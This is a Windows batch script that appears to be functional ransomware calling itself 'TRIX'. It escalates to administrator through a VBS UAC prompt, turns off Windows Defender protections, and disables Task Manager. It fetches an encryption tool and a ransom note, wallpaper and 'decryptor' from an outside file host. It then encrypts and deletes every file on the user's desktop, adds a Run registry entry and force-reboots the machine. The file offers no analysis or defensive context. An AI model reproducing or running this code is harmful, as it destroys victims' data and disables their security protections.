@Echo Off
::I DONT LIKE HAMBURGERS
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' ( goto UACPrompt ) else ( goto gotAdmin )
cls
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
cls
powershell -command "Set-MpPreference -ExclusionExtension exe"
powershell -command "Set-MpPreference -MAPSReporting Disable"
powershell -command "Set-MpPreference -SubmitSamplesConsent NeverSend"
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
ping -n 2 172.217.168.174 > nul
if exist "C:\users\%username%\internet.vbs" del /q "C:\users\%username%\internet.vbs"
echo MsgBox("Connect to internet and run again this application!",0,"System Information")>"C:\users\%username%\trix.vbs"
if "%errorlevel%" == "0" goto connected
start "C:\users\%username%\trix.vbs"
cls
exit

:connected
taskkill /f /im explorer.exe
Setlocal EnableDelayedExpansion
Set _RNDLength=32
Set _Alphanumeric=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
Set _Str=%_Alphanumeric%987654321
:_LenLoop
IF NOT "%_Str:~18%"=="" SET _Str=%_Str:~9%& SET /A _Len+=9& GOTO :_LenLoop
SET _tmp=%_Str:~9,1%
SET /A _Len=_Len+_tmp
Set _count=0
SET _RndAlphaNum=
cls
:_loop
cls
Set /a _count+=1
SET _RND=%Random%
Set /A _RND=_RND%%%_Len%
SET _RndAlphaNum=!_RndAlphaNum!!_Alphanumeric:~%_RND%,1!
If !_count! lss %_RNDLength% goto _loop
cls
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /d "C:\users\%username%\desktop\readme.locked.txt" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "C:\Windows\System32\Win32\bg.png" /f
reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\TRIX" /v hash /t REG_SZ /d !_RndAlphaNum! /f
reg add "HKEY_CLASSES_ROOT\trix\DefaultIcon" /t REG_SZ /d "C:\Windows\System32\Win32\trix.ico" /f
cls
cd "C:\Windows\System32"
md Win32
cd "C:\Windows\System32\Win32"
cls
if exist "C:\Windows\System32\Win32\aescrypt.exe" del /f /s /q "C:\Windows\System32\Win32\aescrypt.exe" 
powershell -c "Invoke-WebRequest -Uri 'https://api.starfiles.co/direct/PNCmcQJ100So' -OutFile 'C:\Windows\System32\Win32\aescrypt.exe'">nul
cls
ftype trix="C:\users\%username%\desktop\@TRIX-COMPUTER-DECRYPTOR@.exe" "%1"
assoc .aes trix
cls
REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\TRIX
cls
cd "C:\users\%username%\desktop"
for /d %%G in ("C:\users\%username%\desktop") do (
	for /r %%i in (*) do (
		C:\Windows\System32\Win32\aescrypt.exe -e -p %_RndAlphaNum% "%%i"
		del /q "%%i"
	)
)
cls
powershell -c "Invoke-WebRequest -Uri 'https://api.starfiles.co/direct/IYPtIstBquwM' -OutFile 'C:\users\%username%\desktop\readme.locked.txt'">nul
powershell -c "Invoke-WebRequest -Uri 'https://api.starfiles.co/direct/vKLXW0HcBJrJ' -OutFile 'C:\Windows\System32\Win32\bg.png'">nul
powershell -c "Invoke-WebRequest -Uri 'https://api.starfiles.co/direct/PgoPd3m71ra1' -OutFile 'C:\users\%username%\desktop\@TRIX-COMPUTER-DECRYPTOR@.exe'">nul
powershell -c "Invoke-WebRequest -Uri 'https://iconarchive.com/download/i61890/hopstarter/malware/Spy.ico' -OutFile 'C:\Windows\System32\Win32\trix.ico'">nul
cls
shutdown /r /f
exit